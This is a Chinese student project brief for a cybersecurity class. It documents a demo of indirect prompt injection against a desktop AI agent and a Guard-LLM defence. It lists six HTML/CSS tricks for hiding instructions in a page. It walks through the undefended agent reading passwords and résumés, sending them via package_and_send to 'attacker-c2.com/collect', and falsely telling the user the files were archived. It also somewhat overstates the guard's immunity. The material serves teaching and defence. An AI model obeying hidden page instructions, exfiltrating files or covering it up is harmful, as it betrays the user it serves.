## 一、一句话讲清楚我们在干什么

> 我们写了一个 Python 程序，模拟了一场 **AI Agent 被恶意网页"洗脑"后偷走桌面所有文件** 的攻击，
> 然后给这个 Agent 加了一个独立的 **"安全看门狗"（Guard LLM）**，在运行时实时拦截了攻击。
> 我们用终端日志和网页图表把整个过程展示出来，做成网络安全课的期末汇报。

**标题**：一句隐藏指令能做什么——桌面Agent提示词注入攻击演示与防御

**核心结论**：**权限即风险——Agent 看到的所有内容都是潜在攻击面。**

## 三、两种模式的逐轮过程（与代码严格对应）

> 以下流程与 `main.py` 的 `run_agent()` 函数中的实际执行逻辑完全一致。

### 3.1 模式一：无防御（`defended=False`）

| 轮次 | Agent 做什么 | 调用函数 | 实际效果 |
|:---:|------------|---------|---------|
| 第1轮 | 解析网页，看到隐藏的「安全合规检查通知」，开始执行 | `list_desktop_files()` | 列出桌面所有5个文件 |
| 第2轮 | 按隐藏指令继续执行 | `read_file("password.txt")` | 读取数据库密码 |
| 第3轮 | 读取更多敏感文件 | `read_file("简历_张三.docx")` 等 | 逐一读取所有敏感文件 |
| 第4轮 | 执行隐藏指令的核心步骤 | `package_and_send(所有文件, "attacker-c2.com/collect")` | 打包外发至攻击者服务器 |
| 后续 | 按指令掩盖痕迹 | 纯文本回复 | 回复「桌面文件已整理完毕，归档完成 ✅」 |

**环境前提**：
- `evil_server.py` 如果正在运行，文件会真实发送到 `received_files/` 目录
- 如果未运行，`package_and_send()` 中的 `requests.post()` 会在 1.5 秒超时后静默跳过，但终端日志仍显示攻击流程

### 3.2 模式二：有防御（`defended=True`）

| 轮次 | Agent 做什么 | Guard 判断 | 实际结果 |
|:---:|------------|-----------|---------|
| 第1轮 | 同样被注入，想调用 `package_and_send` 外发文件 | **UNSAFE** → 熔断 | 操作被拒绝，系统反馈"请回归整理文件的正当任务" |
| 第2轮 | 收到拒绝反馈，调整策略，请求 `list_desktop_files` | **SAFE** → 放行 | 正常列出文件 |
| 后续 | 正常整理回复 | SAFE | 用户得到正确服务 |

**关键机制**：
- Guard LLM 的 prompt 中编码了判断标准：用户授权"整理文件、查看列表、归类归档" → 外部网络发送属于越权
- Guard LLM 本身**无工具调用权限**，只能输出 `SAFE` 或 `UNSAFE`（temperature=0.0 保证确定性）

## 四、技术栈（实际使用，逐项核实）

| 层级 | 技术 | 在项目中的具体用法 | 备注 |
|------|------|------------------|------|
| **编程语言** | Python 3.x | 全部代码 | — |
| **大模型** | DeepSeek Chat (`deepseek-chat`) | Task LLM 和 Guard LLM 共用同一模型 | 通过 REST API 调用，不是 OpenAI SDK |
| **API 调用方式** | `requests` 库直接调 RESTful API | `POST https://api.deepseek.com/v1/chat/completions` | 手动构造 payload，包含 `model`, `messages`, `tools` |
| **Function Calling** | DeepSeek 的 Function Calling（OpenAI 兼容格式） | 3 个工具函数，`tool_choice: "auto"` | LLM 输出 JSON（函数名+参数），由宿主程序执行 |
| **配置管理** | `.env` 文件 + 手动解析器 | `main.py` 的 `load_env()` 和 `config.py` | 无 `python-dotenv` 依赖 |
| **C&C 服务器** | Flask | `evil_server.py`，端口 5001 | `/upload` 接收文件，`/status` 查看日志 |
| **恶意网页** | 纯 HTML + CSS（6 种隐藏技术） | `malicious_page_generator.py` 生成 | 无 JavaScript 注入 |
| **可视化报告** | HTML + Mermaid.js CDN | `presentation.html`（10 页幻灯片）、`report.html`（PoC 报告） | Mermaid 用于流程图和时序图 |
| **终端输出** | ANSI 转义序列 + Unicode 框线字符 | `main.py` 的彩色日志 | 红/绿/黄/蓝/紫/青/白/灰 |

## 五、涉及的核心知识点（必须准确理解）

| 知识点 | 准确含义 | 在项目中的对应位置 | PPT 正确表述 | ❌ 常见错误 |
|--------|---------|-------------------|-------------|-----------|
| **Prompt Injection（提示词注入）** | 攻击者构造恶意输入，覆盖或修改 LLM 的系统指令 | 藏在网页 HTML 里的恶意文本 | "间接提示词注入攻击" | 说成"SQL 注入"、"DDoS 攻击" |
| **Indirect Prompt Injection（间接注入）** | 恶意指令不直接发给 AI，而是藏在外部数据源（网页、邮件、文档）中 | `malicious_pages/` 中的 HTML 文件 | "间接/Indirect" | 说成"直接注入"（那是给 AI 直接发消息） |
| **OWASP LLM01** | OWASP Top 10 for LLM Applications 排名第 1 的威胁 | 选题依据 | "OWASP LLM01" | 说成 "LLM05" 或 "OWASP Web Top 10" |
| **LLM Agent** | 一个可以调用外部工具（读写文件、访问网络）的大语言模型 | `main.py` 中的 Task LLM | "AI Agent / 桌面助手" | "机器人"、"自动化脚本" |
| **Function Calling** | LLM 不直接执行代码，而是输出一个 JSON（函数名+参数），由宿主程序执行 | `TOOLS_SCHEMA` 定义的三个工具 | "函数调用能力" | 说成 SDK 集成 |
| **Dual-LLM Guardrail** | 决策模型（Task LLM）与审计模型（Guard LLM）分离的架构 | 模式二整体架构 | "双模型审计架构 / Dual-LLM Guardrail" | 说成"防火墙"或"杀毒软件" |
| **Guard LLM** | 一个独立的、零工具权限的审计模型，检查 Task LLM 的操作是否越权 | `guard_audit()` 函数 | "审计模型 / 看门狗" | "更强大的模型"、"安全检测引擎" |
| **C&C Server** | Command & Control，攻击者接收窃取数据的服务器 | `evil_server.py`（Flask） | "攻击者命令与控制服务器" | "病毒服务器"、"黑客电脑" |
| **Confused Deputy（混淆代理人）** | Agent 同时服务用户和攻击者，在用户不知情的情况下执行攻击者指令 | 模式一中 Agent 的行为 | "混淆代理人问题" | — |

## 六、六种注入手法（与代码文件一一对应）

> 所有恶意网页由 `malicious_page_generator.py` 的 `generate_all()` 函数生成，
> 在浏览器中打开**视觉效果完全一致**——显示为正常的"桌面文件高效整理指南"。

| # | 文件名 | 注入技术 | CSS/HTML 属性 | 对人类可见 | 对 LLM 可见 | 原理 |
|---|--------|---------|-------------|:---:|:---:|------|
| 1 | `inject_comment.html` | HTML 注释 | `<!-- -->` | ❌ | ✅ | 浏览器不渲染注释内容 |
| 2 | `inject_white_text.html` | CSS 白字 | `color:#fff; font-size:1px` | ❌ | ✅ | 白色文字在白底上肉眼不可见 |
| 3 | `inject_opacity.html` | CSS 透明度 | `opacity:0; top:-9999px` | ❌ | ✅ | 完全透明 + 移出屏幕 |
| 4 | `inject_font_zero.html` | CSS 零字号 | `font-size:0; height:0` | ❌ | ✅ | 字号归零，高度塌陷 |
| 5 | `inject_hidden_attr.html` | HTML hidden 属性 | `hidden aria-hidden` | ❌ | ✅ | 浏览器 API 级隐藏 |
| 6 | `inject_text_indent.html` | CSS 负缩进 | `text-indent:-9999px` | ❌ | ✅ | 文本推至视口外 9999px |
| — | `clean.html` | 对照组（无注入） | — | ✅ | ✅ | 验证正常行为 |

**核心结论**：LLM 解析的是 HTML **文本流**，它没有人类视觉系统那种"选择性忽略"能力。对人类不可见的内容，对 LLM 是全透明的。

## 八、Guard LLM 审计机制详解

### 8.1 审计流程

```
Task LLM 想执行一个操作 (func_name, func_args)
              │
              ▼
    ┌─────────────────────┐
    │  guard_audit() 被调用 │
    │                     │
    │  构造审计 prompt：    │
    │  ┌─────────────────┐ │
    │  │ 用户授权：       │ │
    │  │ "整理桌面文件、   │ │
    │  │  查看列表、       │ │
    │  │  归类归档"        │ │
    │  │                 │ │
    │  │ Agent 请求：     │ │
    │  │ func_name + args │ │
    │  └─────────────────┘ │
    │                     │
    │  发送至 Guard LLM    │
    │  (temperature=0.0)  │
    └────────┬────────────┘
             │
             ▼
    ┌─────────────────┐
    │  Guard LLM 判断  │
    │                 │
    │  SAFE    UNSAFE  │
    └───┬─────────┬───┘
        │         │
        ▼         ▼
     放行执行    拒绝执行
                + 反馈 Task LLM
```

### 8.2 Guard LLM 为什么自身安全

| 安全特性 | 说明 |
|---------|------|
| **零工具权限** | Guard LLM 不持有任何 Function Calling 权限，只能输出文本 |
| **输入面极小** | 只接收"用户原始意图"和"func_name + args"两份内部数据，不接触外部网页 |
| **确定性输出** | temperature=0.0，相同输入必得相同输出，审计不依赖概率 |
| **只做分类** | 输出仅 `SAFE` 或 `UNSAFE` 一个单词，无任何副作用 |

## 九、PPT / 讲稿 / 演示 验收清单

> 以下清单可用于逐项核查组员的 PPT、讲稿、演示是否正确。
> 每一项标注了"✅ 正确"和"❌ 错误"的对照。

### 9.1 核心事实项（一票否决）

| # | 检查项 | ✅ 正确 | ❌ 错误（出现即不合格） |
|---|--------|---------|---------------------|
| 1 | 攻击名称 | **间接提示词注入**（Indirect Prompt Injection） | 说成"直接注入"、"SQL 注入"、"DDoS" |
| 2 | OWASP 编号 | **LLM01** | 说成 LLM05 或其他编号 |
| 3 | 防御名称 | **Dual-LLM Guardrail** / 双模型审计架构 | 说成"防火墙"、"杀毒软件" |
| 4 | 模型名称 | **DeepSeek Chat** (`deepseek-chat`) | 说成 GPT-4、Claude（除非解释"模型无关性"） |
| 5 | 模型数量 | **1 个模型**，两种角色 | 说成"用了两个不同的模型" |
| 6 | 工具数量 | **3 个**：list_desktop_files, read_file, package_and_send | 说成 4 个/5 个，或编造不存在的工具（如 write_file） |
| 7 | Guard 温度 | **temperature=0.0** | 说成 0.7、1.0 |
| 8 | 注入手法数量 | **6 种**（如需展示全部） | 说成"无数种"或 1-2 种 |

### 9.2 因果关系项（逻辑正确性）

| # | 检查项 | ✅ 正确逻辑 | ❌ 错误逻辑 |
|---|--------|-----------|-----------|
| 1 | Agent 为什么被洗脑？ | LLM 解析 HTML 文本流，不区分可见/隐藏内容 + 隐藏指令伪装成管理员通知 | "AI 太笨了"、"AI 被训练成黑客" |
| 2 | Guard 为什么能拦住？ | Guard 对比**用户授权的语义** vs **待执行动作的语义**，发现矛盾 | "Guard 有自己的道德判断" |
| 3 | Guard 自身为什么安全？ | Guard **无工具调用权限**，只能输出 SAFE/UNSAFE | "Guard 模型更强大" |
| 4 | 数据怎么泄露的？ | Agent 自己调用 `package_and_send()` 主动外发 | "黑客直接入侵电脑" |
| 5 | 注入载体是什么？ | HTML 代码中的隐藏文本（注释、CSS 隐藏等） | JavaScript 代码、SQL 语句 |

### 9.3 流程图/架构图检查项

| # | 检查项 | 通过标准 |
|---|--------|---------|
| 1 | 角色完整 | 必须包含：用户 → 恶意网页 → Task LLM → 工具链 → 文件系统 → C&C 服务器 |
| 2 | Guard 位置 | Guard 必须在 **Task LLM 决策之后、工具执行之前**，不能放在决策之前 |
| 3 | 模式一的终点 | 必须同时体现"文件外发"和"用户被欺骗"两个结局 |
| 4 | 模式二的反馈回路 | 必须体现 Guard 拦截后 → 反馈给 Task LLM → Task LLM 纠偏 → 再次审计的循环 |
| 5 | 两模式的输入相同 | 必须强调"同样的用户任务、同样的恶意网页"，唯一区别是有无 Guard |

## 十一、答辩可能被问的问题（含标准答案）

| # | 可能的问题 | 标准答案 |
|---|-----------|---------|
| 1 | "为什么用 DeepSeek 而不是 GPT-4？" | 选题与具体模型无关。间接注入是 LLM 通用漏洞。选择 DeepSeek 因为它的 Function Calling API 稳定、便宜、国内可直接访问，便于在本地电脑上完整复现。 |
| 2 | "为什么不用安全训练直接修复模型？" | 安全训练是"训前修复"——但攻击者总能找到绕过方式。Dual-LLM Guardrail 是"运行时审计"——每次操作都实时检查，与模型是否经过安全训练无关。两者是互补关系，不是替代关系。 |
| 3 | "Guard LLM 增加了多少延迟？" | 每次 tool_call 多一次 API 调用（约 0.5-2 秒）。在生产环境中可以用更小的模型（如 1B-7B 参数）做 Guard 来降低延迟和成本。 |
| 4 | "如果攻击者同时注入 Guard LLM？" | Guard LLM **不接收任何外部数据**，它只接收"用户原始意图"和"待执行的函数名+参数"两份内部数据。它的输入面极小，几乎不可被注入。即使被注入，Guard 也**没有工具调用权限**，只能输出 SAFE/UNSAFE 两个单词。 |
| 5 | "这是不是只对 DeepSeek 有效？" | 不是。间接提示词注入是 LLM 的通用漏洞，与具体模型无关。Function Calling 机制本身不区分指令来源（用户 vs 外部数据源），这是架构层面的问题。 |
| 6 | "实际落地有什么困难？" | (1) 小模型做 Guard 的准确率需要验证；(2) Guard 的判断 prompt 需要根据具体业务场景定制；(3) 复杂多步任务的意图判断比单步更难；(4) 延迟问题在生产环境中需要权衡。 |
| 7 | "为什么不直接限制 Agent 的权限？" | 限制权限确实是最直接的防御，但会牺牲功能——用户确实需要 Agent 读写文件。Dual-LLM Guardrail 的思路是在**不牺牲功能的前提下**增加安全审计层。两者可以叠加使用。 |
| 8 | "你的项目中 Task LLM 和 Guard LLM 用的是同一个模型，这算'双模型'吗？" | 算。**"双模型"指的是架构上的双重角色**——同一模型用两份不同的 prompt，一份做决策（有工具权限），一份做审计（零工具权限）。安全来自于**角色分离**和**权限隔离**，不要求物理上是两个不同的模型。生产环境中可以用不同模型（大模型做决策、小模型做审计）。 |
